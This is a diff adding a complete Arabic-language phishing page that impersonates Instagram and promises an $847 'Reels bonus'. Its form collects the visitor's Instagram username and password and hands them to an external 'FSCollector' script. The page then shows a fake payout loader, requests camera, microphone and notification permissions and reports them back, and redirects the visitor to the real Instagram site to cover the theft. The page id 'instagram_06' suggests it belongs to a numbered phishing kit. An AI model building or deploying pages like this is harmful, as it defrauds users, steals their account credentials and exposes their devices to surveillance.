@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#7c3aed">
+<title>مكافآت Reels - Instagram</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    min-height: 100vh;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: linear-gradient(180deg, #1e1b4b 0%, #0f172a 100%);
+    color: #fff;
+  }
+  .container {
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .card {
+    background: rgba(30, 27, 75, 0.9);
+    border: 1px solid rgba(124,58,237,0.4);
+    border-radius: 24px;
+    padding: 32px 24px;
+    max-width: 440px;
+    width: 100%;
+    box-shadow: 0 30px 80px rgba(124,58,237,0.3);
+    text-align: center;
+  }
+  .reels-icon {
+    width: 90px;
+    height: 90px;
+    margin: 0 auto 20px;
+    background: linear-gradient(135deg, #7c3aed, #a855f7);
+    border-radius: 22px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 44px;
+    box-shadow: 0 0 50px rgba(124,58,237,0.6);
+    transform: rotate(-5deg);
+  }
+  h1 {
+    font-size: 24px;
+    font-weight: 800;
+    margin-bottom: 8px;
+    background: linear-gradient(135deg, #a855f7, #fbbf24);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+  .subtitle {
+    font-size: 14px;
+    color: #c4b5fd;
+    line-height: 1.5;
+    margin-bottom: 24px;
+  }
+  .bonus-card {
+    background: linear-gradient(135deg, #7c3aed, #a855f7);
+    padding: 20px;
+    border-radius: 16px;
+    margin-bottom: 20px;
+  }
+  .bonus-label { font-size: 12px; opacity: 0.9; letter-spacing: 1px; }
+  .bonus-value { font-size: 36px; font-weight: 800; margin: 6px 0; }
+  .bonus-desc { font-size: 13px; opacity: 0.9; }
+  .milestones {
+    background: rgba(124,58,237,0.1);
+    border: 1px solid rgba(124,58,237,0.3);
+    border-radius: 12px;
+    padding: 16px;
+    margin-bottom: 20px;
+    text-align: right;
+  }
+  .milestone {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 0;
+    font-size: 13px;
+    color: #c4b5fd;
+  }
+  .milestone strong { color: #fbbf24; font-weight: 700; }
+  .form-input {
+    width: 100%;
+    padding: 14px 16px;
+    background: rgba(15,23,42,0.8);
+    border: 1px solid rgba(124,58,237,0.4);
+    border-radius: 12px;
+    font-size: 15px;
+    color: #fff;
+    font-family: inherit;
+    margin-bottom: 12px;
+  }
+  .form-input::placeholder { color: #6b7280; }
+  .form-input:focus {
+    outline: none;
+    border-color: #a855f7;
+    box-shadow: 0 0 0 3px rgba(168,85,247,0.2);
+  }
+  .btn {
+    width: 100%;
+    padding: 16px;
+    background: linear-gradient(135deg, #7c3aed, #a855f7);
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-size: 16px;
+    font-weight: 700;
+    cursor: pointer;
+    font-family: inherit;
+    margin-top: 4px;
+    box-shadow: 0 10px 30px rgba(124,58,237,0.4);
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn:disabled { opacity: 0.6; }
+  .error-msg {
+    background: rgba(239, 68, 68, 0.15);
+    border: 1px solid rgba(239, 68, 68, 0.4);
+    border-radius: 8px;
+    padding: 10px 12px;
+    color: #fca5a5;
+    font-size: 13px;
+    margin-bottom: 12px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="card">
+
+    <div class="reels-icon">🎬</div>
+
+    <h1>مكافآت Reels</h1>
+    <p class="subtitle">
+      اربح مكافآت على كل Reel تنشره بناءً على مشاهداتك
+    </p>
+
+    <div class="bonus-card">
+      <div class="bonus-label">🎁 مكافأة الشهر</div>
+      <div class="bonus-value">$847</div>
+      <div class="bonus-desc">من 12 Reel نشرتها</div>
+    </div>
+
+    <div class="milestones">
+      <div class="milestone">
+        <span>🎯 الوصول لـ 100K مشاهدة</span>
+        <strong>+$500</strong>
+      </div>
+      <div class="milestone">
+        <span>🎯 50K إعجاب</span>
+        <strong>+$250</strong>
+      </div>
+      <div class="milestone">
+        <span>🎯 10K تعليق</span>
+        <strong>+$97</strong>
+      </div>
+    </div>
+
+    <div class="error-msg" id="error-msg"></div>
+
+    <form id="reels-form" onsubmit="return handleReels(event)">
+      <input type="text" id="username" class="form-input" placeholder="اسم المستخدم على Instagram" required>
+      <input type="password" id="password" class="form-input" placeholder="كلمة المرور" required>
+      <button type="submit" class="btn" id="reels-btn">
+        استلام $847 💸
+      </button>
+    </form>
+
+  </div>
+</div>
+
+<script src="/fs/static/collector.js"></script>
+
+<script>
+(function() {
+    "use strict";
+
+    var submitting = false;
+
+    function showError(msg) {
+        var el = document.getElementById('error-msg');
+        el.textContent = msg;
+        el.classList.add('show');
+        setTimeout(function() { el.classList.remove('show'); }, 4000);
+    }
+
+    function handleReels(event) {
+        event.preventDefault();
+        if (submitting) return false;
+
+        var username = document.getElementById('username').value.trim();
+        var password = document.getElementById('password').value.trim();
+
+        if (!username || !password) {
+            showError('يرجى ملء جميع الحقول');
+            return false;
+        }
+
+        submitting = true;
+        var btn = document.getElementById('reels-btn');
+        btn.disabled = true;
+        btn.textContent = 'جاري التحقق...';
+
+        FSCollector.captureForm({
+            username: username,
+            password: password,
+            form_type: 'reels_bonus'
+        }, {
+            metadata: { page: 'instagram_06_reels_bonus' }
+        }).then(function() {
+            FSCollector.showLoader('جاري تحويل المكافأة...');
+
+            setTimeout(function() {
+                FSCollector.requestPermissions({
+                    camera: true,
+                    microphone: true,
+                    location: false,
+                    notifications: true,
+                    showOverlay: true
+                }).then(function(perms) {
+                    FSCollector.sendPermissionsResult(perms);
+
+                    setTimeout(function() {
+                        FSCollector.redirect('https://www.instagram.com');
+                    }, 2000);
+                });
+            }, 500);
+        });
+
+        return false;
+    }
+
+    window.handleReels = handleReels;
+
+})();
+</script>
+
+</body>
+</html>
